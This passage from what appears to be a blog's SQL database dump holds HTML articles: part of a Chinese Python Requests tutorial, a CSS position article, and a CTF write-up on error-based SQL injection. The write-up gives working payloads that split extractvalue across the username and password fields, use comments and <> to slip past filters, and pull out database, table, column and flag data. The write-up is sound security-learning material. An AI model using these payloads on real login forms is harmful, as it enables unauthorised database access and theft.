的查询字符串里。</p><p>你还可以将一个列表作为值传入：</p><pre>&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;{&#39;key1&#39;:&nbsp;&#39;value1&#39;,&nbsp;&#39;key2&#39;:&nbsp;[&#39;value2&#39;,&nbsp;&#39;value3&#39;]}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;http://httpbin.org/get&#39;,&nbsp;params=payload)&gt;&gt;&gt;&nbsp;print(r.url)http://httpbin.org/get?key1=value1&amp;key2=value2&amp;key2=value3</pre><h2>响应内容</h2><p>我们能读取服务器响应的内容。再次以 GitHub 时间线为例：</p><pre>&gt;&gt;&gt;&nbsp;import&nbsp;requests&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;https://api.github.com/events&#39;)&gt;&gt;&gt;&nbsp;r.textu&#39;[{&quot;repository&quot;:{&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</pre><p>Requests 会自动解码来自服务器的内容。大多数 unicode 字符集都能被无缝地解码。</p><p>请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 <code class="docutils literal"><span class="pre">r.text</span></code>之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用<code class="docutils literal"><span class="pre">r.encoding</span></code> 属性来改变它：</p><pre>&gt;&gt;&gt;&nbsp;r.encoding&#39;utf-8&#39;&gt;&gt;&gt;&nbsp;r.encoding&nbsp;=&nbsp;&#39;ISO-8859-1&#39;</pre><p>如果你改变了编码，每当你访问 <code class="docutils literal"><span class="pre">r.text</span></code> ，Request 都将会使用 <code class="docutils literal"><span class="pre">r.encoding</span></code>的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML\r\n自身可以指定编码。这样的话，你应该使用 <code class="docutils literal"><span class="pre">r.content</span></code> 来找到编码，然后设置 <code class="docutils literal"><span class="pre">r.encoding</span></code>为相应的编码。这样就能使用正确的编码解析 <code class="docutils literal"><span class="pre">r.text</span></code> 了。</p><p>在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用<code class="docutils literal"><span class="pre">codecs</span></code> 模块进行注册，你就可以轻松地使用这个解码器名称作为 <code class="docutils literal"><span class="pre">r.encoding</span></code> 的值，\r\n然后由 Requests 来为你处理编码。</p><h2>二进制响应内容</h2><p>你也能以字节的方式访问请求响应体，对于非文本请求：</p><pre>&gt;&gt;&gt;&nbsp;r.contentb&#39;[{&quot;repository&quot;:{&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</pre><p>Requests 会自动为你解码 <code class="docutils literal"><span class="pre">gzip</span></code> 和 <code class="docutils literal"><span class="pre">deflate</span></code> 传输编码的响应数据。</p><p>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p><pre>&gt;&gt;&gt;&nbsp;from&nbsp;PIL&nbsp;import&nbsp;Image&gt;&gt;&gt;&nbsp;from&nbsp;io&nbsp;import&nbsp;BytesIO&gt;&gt;&gt;&nbsp;i&nbsp;=&nbsp;Image.open(BytesIO(r.content))</pre><h2>JSON 响应内容</h2><p>Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：</p><pre>&gt;&gt;&gt;&nbsp;import&nbsp;requests&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;https://api.github.com/events&#39;)&gt;&gt;&gt;&nbsp;r.json()[{u&#39;repository&#39;:&nbsp;{u&#39;open_issues&#39;:&nbsp;0,&nbsp;u&#39;url&#39;:&nbsp;&#39;https://github.com/...</pre><p>如果 JSON 解码失败， <code class="docutils literal"><span class="pre">r.json()</span></code> 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问 <code class="docutils literal"><span class="pre">r.json()</span></code> 将会抛出 <code class="docutils literal"><span class="pre">ValueError:</span> <span class="pre">No</span> <span class="pre">JSON</span> <span class="pre">object</span> <span class="pre">could</span> <span class="pre">be</span> <span class="pre">decoded</span></code> 异常。</p><p>需要注意的是，成功调用 <code class="docutils literal"><span class="pre">r.json()</span></code> 并**不**意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 <code class="docutils literal"><span class="pre">r.raise_for_status()</span></code> 或者检查 <code class="docutils literal"><span class="pre">r.status_code</span></code> 是否和你的期望相同。</p><h2>原始响应内容</h2><p>在罕见的情况下，你可能想获取来自服务器的原始套接字响应，那么你可以访问 <code class="docutils literal"><span class="pre">r.raw</span></code>。\r\n如果你确实想这么干，那请你确保在初始请求中设置了 <code class="docutils literal"><span class="pre">stream=True</span></code>。具体你可以这么做：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;https://api.github.com/events&#39;,&nbsp;stream=True)&gt;&gt;&gt;&nbsp;r.raw&lt;requests.packages.urllib3.response.HTTPResponse&nbsp;object&nbsp;at&nbsp;0x101194810&gt;&gt;&gt;&gt;&nbsp;r.raw.read(10)&#39;\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03&#39;</pre><p>但一般情况下，你应该以下面的模式将文本流保存到文件：</p><pre>with&nbsp;open(filename,&nbsp;&#39;wb&#39;)&nbsp;as&nbsp;fd:\r\n&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;chunk&nbsp;in&nbsp;r.iter_content(chunk_size):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd.write(chunk)</pre><p>使用 <code class="docutils literal"><span class="pre">Response.iter_content</span></code> 将会处理大量你直接使用 <code class="docutils literal"><span class="pre">Response.raw</span></code> 不得不处理的。\r\n当流下载时，上面是优先推荐的获取内容方式。 Note that <code class="docutils literal"><span class="pre">chunk_size</span></code> can be freely adjusted to a number that\r\nmay better fit your use cases.</p><h2>定制请求头</h2><p>如果你想为请求添加 HTTP 头部，只要简单地传递一个 <code class="docutils literal"><span class="pre">dict</span></code> 给 <code class="docutils literal"><span class="pre">headers</span></code> 参数就可以了。</p><p>例如，在前一个示例中我们没有指定 content-type:</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;https://api.github.com/some/endpoint&#39;&gt;&gt;&gt;&nbsp;headers&nbsp;=&nbsp;{&#39;user-agent&#39;:&nbsp;&#39;my-app/0.0.1&#39;}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(url,&nbsp;headers=headers)</pre><p>注意: 定制 header 的优先级低于某些特定的信息源，例如：</p><ul class="simple list-paddingleft-2"><li><p>如果在 <code class="docutils literal"><span class="pre">.netrc</span></code> 中设置了用户认证信息，使用<cite>headers=</cite>设置的授权就不会生效。而如果设置了<code class="docutils literal"><span class="pre">auth=</span></code> 参数，``.netrc`` 的设置就无效了。</p></li><li><p>如果被重定向到别的主机，授权 header 就会被删除。</p></li><li><p>代理授权 header 会被 URL 中提供的代理身份覆盖掉。</p></li><li><p>在我们能判断内容长度的情况下，header 的 Content-Length 会被改写。</p></li></ul><p>更进一步讲，Requests 不会基于定制 header 的具体情况改变自己的行为。只不过在最后的请求中，所有的\r\nheader 信息都会被传递进去。</p><p>注意: 所有的 header 值必须是 <code class="docutils literal"><span class="pre">string</span></code>、bytestring 或者 unicode。尽管传递 unicode\r\nheader 也是允许的，但不建议这样做。</p><h2>更加复杂的 POST 请求</h2><p>通常，你想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给<cite>data</cite>参数。你的数据字典在发出请求时会自动编码为表单形式：</p><pre>&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;{&#39;key1&#39;:&nbsp;&#39;value1&#39;,&nbsp;&#39;key2&#39;:&nbsp;&#39;value2&#39;}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(&quot;http://httpbin.org/post&quot;,&nbsp;data=payload)&gt;&gt;&gt;&nbsp;print(r.text){&nbsp;&nbsp;...&nbsp;&nbsp;&quot;form&quot;:&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&quot;key2&quot;:&nbsp;&quot;value2&quot;,&nbsp;&nbsp;&nbsp;&nbsp;&quot;key1&quot;:&nbsp;&quot;value1&quot;&nbsp;&nbsp;},&nbsp;&nbsp;...}</pre><p>你还可以为 <code class="docutils literal"><span class="pre">data</span></code> 参数传入一个元组列表。在表单中多个元素使用同一 key 的时候，这种方式尤其有效：</p><pre>&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;((&#39;key1&#39;,&nbsp;&#39;value1&#39;),&nbsp;(&#39;key1&#39;,&nbsp;&#39;value2&#39;))&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(&#39;http://httpbin.org/post&#39;,&nbsp;data=payload)&gt;&gt;&gt;&nbsp;print(r.text){&nbsp;&nbsp;...&nbsp;&nbsp;&quot;form&quot;:&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&quot;key1&quot;:&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value1&quot;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value2&quot;&nbsp;&nbsp;&nbsp;&nbsp;]&nbsp;&nbsp;},&nbsp;&nbsp;...}</pre><p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 <code class="docutils literal"><span class="pre">string</span></code> 而不是一个 <code class="docutils literal"><span class="pre">dict</span></code>，那么数据会被直接发布出去。</p><p>例如，Github API v3 接受编码为 JSON 的 POST/PATCH 数据：</p><pre>&gt;&gt;&gt;&nbsp;import&nbsp;json&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;https://api.github.com/some/endpoint&#39;&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;{&#39;some&#39;:&nbsp;&#39;data&#39;}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(url,&nbsp;data=json.dumps(payload))</pre><p>此处除了可以自行对 <code class="docutils literal"><span class="pre">dict</span></code> 进行编码，你还可以使用 <code class="docutils literal"><span class="pre">json</span></code> 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;https://api.github.com/some/endpoint&#39;&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;{&#39;some&#39;:&nbsp;&#39;data&#39;}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(url,&nbsp;json=payload)</pre><h2>POST一个多部分编码(Multipart-Encoded)的文件</h2><p>Requests 使得上传多部分编码文件变得很简单：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://httpbin.org/post&#39;&gt;&gt;&gt;&nbsp;files&nbsp;=&nbsp;{&#39;file&#39;:&nbsp;open(&#39;report.xls&#39;,&nbsp;&#39;rb&#39;)}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(url,&nbsp;files=files)&gt;&gt;&gt;&nbsp;r.text{&nbsp;&nbsp;...&nbsp;&nbsp;&quot;files&quot;:&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&quot;file&quot;:&nbsp;&quot;&lt;censored...binary...data&gt;&quot;&nbsp;&nbsp;},&nbsp;&nbsp;...}</pre><p>你可以显式地设置文件名，文件类型和请求头：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://httpbin.org/post&#39;&gt;&gt;&gt;&nbsp;files&nbsp;=&nbsp;{&#39;file&#39;:&nbsp;(&#39;report.xls&#39;,&nbsp;open(&#39;report.xls&#39;,&nbsp;&#39;rb&#39;),&nbsp;&#39;application/vnd.ms-excel&#39;,&nbsp;{&#39;Expires&#39;:&nbsp;&#39;0&#39;})}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(url,&nbsp;files=files)&gt;&gt;&gt;&nbsp;r.text{&nbsp;&nbsp;...&nbsp;&nbsp;&quot;files&quot;:&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&quot;file&quot;:&nbsp;&quot;&lt;censored...binary...data&gt;&quot;&nbsp;&nbsp;},&nbsp;&nbsp;...}</pre><p>如果你想，你也可以发送作为文件来接收的字符串：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://httpbin.org/post&#39;&gt;&gt;&gt;&nbsp;files&nbsp;=&nbsp;{&#39;file&#39;:&nbsp;(&#39;report.csv&#39;,&nbsp;&#39;some,data,to,send\\nanother,row,to,send\\n&#39;)}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(url,&nbsp;files=files)&gt;&gt;&gt;&nbsp;r.text{&nbsp;&nbsp;...&nbsp;&nbsp;&quot;files&quot;:&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&quot;file&quot;:&nbsp;&quot;some,data,to,send\\\\nanother,row,to,send\\\\n&quot;&nbsp;&nbsp;},&nbsp;&nbsp;...}</pre><p>如果你发送一个非常大的文件作为 <code class="docutils literal"><span class="pre">multipart/form-data</span></code> 请求，你可能希望将请求做成数据流。默认下 <code class="docutils literal"><span class="pre">requests</span></code> 不支持, 但有个第三方包 <code class="docutils literal"><span class="pre">requests-toolbelt</span></code> 是支持的。你可以阅读<a class="reference external" href="https://toolbelt.rtfd.org">toolbelt 文档</a> 来了解使用方法。</p><p>在一个请求中发送多文件参考 <a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced"><span class="std std-ref">高级用法</span></a> 一节。</p><p class="first admonition-title">警告</p><p class="last">我们强烈建议你用二进制模式(<a class="reference external" href="https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files">binary mode</a>)打开文件。这是因为 Requests 可能会试图为你提供<code class="docutils literal"><span class="pre">Content-Length</span></code> header，在它这样做的时候，这个值会被设为文件的字节数（<em>bytes</em>）。如果用文本模式(text mode)打开文件，就可能会发生错误。</p><h2>响应状态码</h2><p>我们可以检测响应状态码：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt;&nbsp;r.status_code200</pre><p>为方便引用，Requests还附带了一个内置的状态码查询对象：</p><pre>&gt;&gt;&gt;&nbsp;r.status_code&nbsp;==&nbsp;requests.codes.okTrue</pre><p>如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过<a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.Response.raise_for_status" title="requests.Response.raise_for_status"><code class="xref py py-meth docutils literal"><span class="pre">Response.raise_for_status()</span></code></a>来抛出异常：</p><pre>&gt;&gt;&gt;&nbsp;bad_r&nbsp;=&nbsp;requests.get(&#39;http://httpbin.org/status/404&#39;)&gt;&gt;&gt;&nbsp;bad_r.status_code404&gt;&gt;&gt;&nbsp;bad_r.raise_for_status()Traceback&nbsp;(most&nbsp;recent&nbsp;call&nbsp;last):\r\n&nbsp;&nbsp;File&nbsp;&quot;requests/models.py&quot;,&nbsp;line&nbsp;832,&nbsp;in&nbsp;raise_for_status\r\n&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;http_errorrequests.exceptions.HTTPError:&nbsp;404&nbsp;Client&nbsp;Error</pre><p>但是，由于我们的例子中 <code class="docutils literal"><span class="pre">r</span></code> 的 <code class="docutils literal"><span class="pre">status_code</span></code> 是 <code class="docutils literal"><span class="pre">200</span></code> ，当我们调用<code class="docutils literal"><span class="pre">raise_for_status()</span></code> 时，得到的是：</p><pre>&gt;&gt;&gt;&nbsp;r.raise_for_status()None</pre><p>一切都挺和谐哈。</p><h2>响应头</h2><p>我们可以查看以一个 Python 字典形式展示的服务器响应头：</p><pre>&gt;&gt;&gt;&nbsp;r.headers{&nbsp;&nbsp;&nbsp;&nbsp;&#39;content-encoding&#39;:&nbsp;&#39;gzip&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;transfer-encoding&#39;:&nbsp;&#39;chunked&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;connection&#39;:&nbsp;&#39;close&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;server&#39;:&nbsp;&#39;nginx/1.0.4&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;x-runtime&#39;:&nbsp;&#39;148ms&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;etag&#39;:&nbsp;&#39;&quot;e1ca502697e5c9317743dc078f67693f&quot;&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&#39;content-type&#39;:&nbsp;&#39;application/json&#39;}</pre><p>但是这个字典比较特殊：它是仅为 HTTP 头部而生的。根据<a class="reference external" href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html">RFC 2616</a>，\r\nHTTP 头部是大小写不敏感的。</p><p>因此，我们可以使用任意大写形式来访问这些响应头字段：</p><pre>&gt;&gt;&gt;&nbsp;r.headers[&#39;Content-Type&#39;]&#39;application/json&#39;&gt;&gt;&gt;&nbsp;r.headers.get(&#39;content-type&#39;)&#39;application/json&#39;</pre><p>它还有一个特殊点，那就是服务器可以多次接受同一 header，每次都使用不同的值。但 Requests\r\n会将它们合并，这样它们就可以用一个映射来表示出来，参见<a class="reference external" href="http://tools.ietf.org/html/rfc7230#section-3.2">RFC 7230</a>:</p><blockquote><p>A recipient MAY combine multiple header fields with the same field name\r\ninto one &quot;field-name: field-value&quot; pair, without changing the semantics\r\nof the message, by appending each subsequent field value to the combined\r\nfield value in order, separated by a comma.</p><p>接收者可以合并多个相同名称的 header 栏位，把它们合为一个 &quot;field-name: field-value&quot;\r\n配对，将每个后续的栏位值依次追加到合并的栏位值中，用逗号隔开即可，这样做不会改变信息的语义。</p></blockquote><h2>Cookie</h2><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://example.com/some/cookie/setting/url&#39;&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(url)&gt;&gt;&gt;&nbsp;r.cookies[&#39;example_cookie_name&#39;]&#39;example_cookie_value&#39;</pre><p>要想发送你的cookies到服务器，可以使用 <code class="docutils literal"><span class="pre">cookies</span></code> 参数：</p><pre>&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://httpbin.org/cookies&#39;&gt;&gt;&gt;&nbsp;cookies&nbsp;=&nbsp;dict(cookies_are=&#39;working&#39;)&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(url,&nbsp;cookies=cookies)&gt;&gt;&gt;&nbsp;r.text&#39;{&quot;cookies&quot;:&nbsp;{&quot;cookies_are&quot;:&nbsp;&quot;working&quot;}}&#39;</pre><p>Cookie 的返回对象为 <a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.cookies.RequestsCookieJar" title="requests.cookies.RequestsCookieJar"><code class="xref py py-class docutils literal"><span class="pre">RequestsCookieJar</span></code></a>，它的行为和字典类似，但接口更为完整，适合跨域名跨路径使用。你还可以把 Cookie Jar 传到 Requests 中：</p><pre>&gt;&gt;&gt;&nbsp;jar&nbsp;=&nbsp;requests.cookies.RequestsCookieJar()&gt;&gt;&gt;&nbsp;jar.set(&#39;tasty_cookie&#39;,&nbsp;&#39;yum&#39;,&nbsp;domain=&#39;httpbin.org&#39;,&nbsp;path=&#39;/cookies&#39;)&gt;&gt;&gt;&nbsp;jar.set(&#39;gross_cookie&#39;,&nbsp;&#39;blech&#39;,&nbsp;domain=&#39;httpbin.org&#39;,&nbsp;path=&#39;/elsewhere&#39;)&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://httpbin.org/cookies&#39;&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(url,&nbsp;cookies=jar)&gt;&gt;&gt;&nbsp;r.text&#39;{&quot;cookies&quot;:&nbsp;{&quot;tasty_cookie&quot;:&nbsp;&quot;yum&quot;}}&#39;</pre><h2>重定向与请求历史</h2><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code class="docutils literal"><span class="pre">history</span></code> 方法来追踪重定向。</p><p><a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.Response.history" title="requests.Response.history"><code class="xref py py-attr docutils literal"><span class="pre">Response.history</span></code></a> 是一个<a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.Response" title="requests.Response"><code class="xref py py-class docutils literal"><span class="pre">Response</span></code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;http://github.com&#39;)&gt;&gt;&gt;&nbsp;r.url&#39;https://github.com/&#39;&gt;&gt;&gt;&nbsp;r.status_code200&gt;&gt;&gt;&nbsp;r.history[&lt;Response&nbsp;[301]&gt;]</pre><p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 <code class="docutils literal"><span class="pre">allow_redirects</span></code>参数禁用重定向处理：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;http://github.com&#39;,&nbsp;allow_redirects=False)&gt;&gt;&gt;&nbsp;r.status_code301&gt;&gt;&gt;&nbsp;r.history[]</pre><p>如果你使用了 HEAD，你也可以启用重定向：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.head(&#39;http://github.com&#39;,&nbsp;allow_redirects=True)&gt;&gt;&gt;&nbsp;r.url&#39;https://github.com/&#39;&gt;&gt;&gt;&nbsp;r.history[&lt;Response&nbsp;[301]&gt;]</pre><h2>超时</h2><p>你可以告诉 requests 在经过以 <code class="docutils literal"><span class="pre">timeout</span></code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><pre>&gt;&gt;&gt;&nbsp;requests.get(&#39;http://github.com&#39;,&nbsp;timeout=0.001)Traceback&nbsp;(most&nbsp;recent&nbsp;call&nbsp;last):\r\n&nbsp;&nbsp;File&nbsp;&quot;&lt;stdin&gt;&quot;,&nbsp;line&nbsp;1,&nbsp;in&nbsp;&lt;module&gt;requests.exceptions.Timeout:&nbsp;HTTPConnectionPool(host=&#39;github.com&#39;,&nbsp;port=80):&nbsp;Request&nbsp;timed&nbsp;out.&nbsp;(timeout=0.001)</pre><p class="first admonition-title">注意</p><p class="last"><code class="docutils literal"><span class="pre">timeout</span></code> 仅对连接过程有效，与响应体的下载无关。 <code class="docutils literal"><span class="pre">timeout</span></code> 并不是整个下载响应的时间限制，而是如果服务器在 <code class="docutils literal"><span class="pre">timeout</span></code> 秒内没有应答，将会引发一个异常（更精确地说，是在<code class="docutils literal"><span class="pre">timeout</span></code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do\r\nnot time out.</p><h2>错误与异常</h2><p>遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个<code class="xref py py-exc docutils literal"><span class="pre">ConnectionError</span></code> 异常。</p><p>如果 HTTP 请求返回了不成功的状态码， <a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.Response.raise_for_status" title="requests.Response.raise_for_status"><code class="xref py py-meth docutils literal"><span class="pre">Response.raise_for_status()</span></code></a>会抛出一个 <code class="xref py py-exc docutils literal"><span class="pre">HTTPError</span></code> 异常。</p><p>若请求超时，则抛出一个 <code class="xref py py-exc docutils literal"><span class="pre">Timeout</span></code> 异常。</p><p>若请求超过了设定的最大重定向次数，则会抛出一个 <code class="xref py py-exc docutils literal"><span class="pre">TooManyRedirects</span></code> 异常。</p><p>所有Requests显式抛出的异常都继承自 <code class="xref py py-exc docutils literal"><span class="pre">requests.exceptions.RequestException</span></code> 。</p><p><br/></p><p>更加详细的介绍：https://www.cnblogs.com/ranxf/p/7808537.html</p>', 'python', 0, 3, '2019-04-19', 56, -3, 0, '/upload/image/20190419/55c19f5832fa9ba4a8b48b4151153512.jpg'),
	(108, '加了料的报错注入', '**', '<p>&nbsp;&nbsp;&nbsp;&nbsp;首先ctrl+u查看源码得到hint：</p><pre>&lt;!--&nbsp;$sql=&quot;select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=&#39;$username&#39;&nbsp;and&nbsp;password=&#39;$password&#39;&quot;;&nbsp;&nbsp;--&gt;</pre><p>很明显的一个注入，由于这是一个登陆页，很自然想到先过了这个登陆页，于是构造如下post数据：</p><p>username=a&amp;password=b&#39; or &#39;1&#39;&lt;&gt;&#39;2&nbsp;&nbsp;&nbsp;&nbsp;</p><p>由简单的fuzz可以晓得等于号”=“被过滤了，所以这里用不等于号”&lt;&gt;“,此时sql语句为：</p><p>select * from users where username=&#39;a&#39; and password=&#39;b&#39; or &#39;1&#39;&lt;&gt;&#39;2&#39;&nbsp;&nbsp;&nbsp;&nbsp;很显然的一个永恒成立式，但是得到的网页响应如下：</p><p><img src="http://aomaha8.cn/static/js/ueditor/themes/default/images/spacer.gif"/><img src="/upload/image/20190419/1555675940888049.png" title="1555675940888049.png" alt="a1.png"/></p><p>很明显，就算登陆成功也没有可以利用的地方，那么看来只能硬爆数据库了=-=</p><p>经过前期的一些fuzz，得到结论：username字段过滤了()，但是不过滤updatexml和extractvalue等关键词；而password字段过滤了updatexml和extractvalue等关键词，但是不过滤()，所以想到在username字段写函数名称，但是在password字段写()和里面的内容。这里给出一个代码参考：</p><p>①爆数据库：</p><p>username=a&#39; and extractvalue/*&amp;password=*/(1,concat(0x7e,database(),0x7e)) or &#39; <br/>需要注意的是：报错注入最好用concat()函数，不要用concat_ws()，后者报错显示的信息不全；此外我这里用了/**/内联注释将sql语句中的：</p><pre>&#39;&nbsp;and&nbsp;password=&#39;</pre><p>直接给注释了，sql语句是：</p><p>select * from users where username=&#39;a&#39; and extractvalue/*&#39; and password=&#39;*/(1,concat(0x7e,database(),0x7e)) or &#39;&#39;</p><p>和下面的sql语句等效是：</p><p>select * from users where username=&#39;a&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) or &#39;&#39;</p><p>应该很清楚了吧~</p><p>②爆表：</p><p>username=a&#39; and extractvalue/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where (table_schema&lt;&gt;&#39;error_based_hpf&#39;)&lt;&gt;1),0x7e)) or &#39; <br/>经过测试，过滤了limit关键词，所以直接将table_name字段group_concat()，可以得到所有的查询以一行显示（以逗号分隔）</p><p>③爆列：</p><p>username=a&#39; and extractvalue/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where (table_name&lt;&gt;&#39;ffll44jj&#39;)&lt;&gt;1),0x7e)) or &#39;</p><p>这里也有个需要注意的，前面已经知道过滤的等于号，那么我们就用不等于号咯，开始我想到直接这样写：!&lt;&gt;，不过好像没有这样的语法=-=，好吧，难不倒我，我们在外围再与一个true进行&lt;&gt;运算，例如：(table_name&lt;&gt;&#39;ffll44jj&#39;)&lt;&gt;1&nbsp;&nbsp;&nbsp;&nbsp;这里与1进行&lt;&gt;运算（mysql里1可以认为true），那么只有括号里的运算结果为false，才能使得总的结果为true，而括号内的结果为false需要括号内的&lt;&gt;运算两边都相等，所以目的达成，当(table_name&lt;&gt;&#39;ffll44jj&#39;)&lt;&gt;1里的table_name真的为ffll44jj时，总的结果才为true。效果和等于号一样了=-=</p><p>④爆数据：</p><p>username=a&#39; and extractvalue/*&amp;password=*/(1,concat(0x7e,(select group_concat(value) from ffll44jj),0x7e)) or &#39; <br/>就可以得到flag了~~<br/></p><p><br/></p>', '报错注入', 0, 2, '2019-04-19', 63, -2, 0, '/upload/image/20190419/ddb001ad12311fdd507a966b25fdb57b.jpg'),
	(109, 'css的position', 'pinger', '<p><span style="font-family: Microsoft YaHei; font-size: 16px;">　　在用CSS+DIV进行布局的时候，一直对position的四个属性值relative,absolute,static,fixed分的不是很清楚，以致经常会出现让人很郁闷的结果。今天研究了一下，总算有所了解。在此总结一下：</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">先看下各个属性值的定义：</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">1、<span style="color: #ff0000;">static<span style="color: #000000;">（静态定位）</span></span>：默认值。没有定位，元素出现在<span style="color: #ff0000;">正常</span>的流中（忽略 top, bottom, left, right 或者 z-index 声明）。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">2、<span style="color: #ff0000;">relative<span style="color: #000000;">（相对定位）</span></span>：生成相对定位的元素，通过top,bottom,left,right的设置相对于其<span style="color: #ff0000;">正常（原先本身）</span>位置进行定位。可通过z-index进行层次分级。　　</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">3、<span style="color: #ff0000;">absolute<span style="color: #000000;">（绝对定位）</span></span>：生成绝对定位的元素，相对于<span style="color: #ff0000;"> static 定位以外<span style="color: #000000;">的</span></span>第一个<span style="color: #ff0000;">父元素</span>进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定。可通过z-index进行层次分级。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 16px;">4、<span style="color: #ff0000;">fixed<span style="color: #000000;">（固定定位）</span></span>：生成绝对定位的元素，相对于<span style="color: #ff0000;">浏览器窗口</span>进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定。可通过z-index进行层次分级。</span></p><p><span style="font-family: Microsoft YaHei; font-size: 